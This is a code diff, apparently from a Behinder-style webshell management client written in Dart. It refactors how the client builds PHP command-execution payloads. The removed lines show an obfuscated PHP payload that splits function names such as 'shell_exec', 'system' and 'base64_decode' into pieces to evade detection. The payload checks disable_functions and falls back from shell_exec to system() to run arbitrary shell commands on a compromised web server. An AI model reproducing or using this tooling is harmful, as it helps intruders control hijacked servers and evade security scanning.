@@ -7,6 +7,7 @@ import 'package:http/http.dart' as http;
 
 import '../core/async/serial_queue.dart';
 import '../core/crypto/behinder_crypto.dart';
+import 'php_command_payload.dart';
 import 'shell_script_dir_probe.dart';
 import '../models/file_entry.dart';
 import '../utils/encoding_utils.dart';
@@ -188,20 +189,10 @@ echo encrypt(json_encode(\$result));
     final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
         ? 'cd ${_sq(workingDir)} && '
         : '';
-    final b64 = base64.encode(utf8.encode(
+    final code = buildPhpCommandPayload(
       '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}',
-    ));
-    // 与 php_eval 完全一致，raw string 中 $ 不转义（Dart 仅 ${} 会插值）
-    // 与 php_eval 同款修正：只在 shell_exec 被禁用时才走 system()，
-    // 避免静默命令因 shell_exec 返回 null 而被执行第二次。
-    final code =
-        "\$f='base'.'64_decode';\$c=\$f('$b64');"
-        r"$d='preg'.'_split';"
-        r"$df=$d('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
-        r"$s='shell'.'_exec';"
-        r"if(function_exists($s)&&!in_array($s,$df,true)){echo (string)@$s($c.' 2>&1');}"
-        r"$y='sys'.'tem';"
-        r"else{@$y($c.' 2>&1');}";
+    );
+    // 与 php_eval 共用同一份命令载荷，确保 if/else 结构与 shell_exec 回退一致。
     final r = await _sendPhp(code);
     return r.trim();
   }
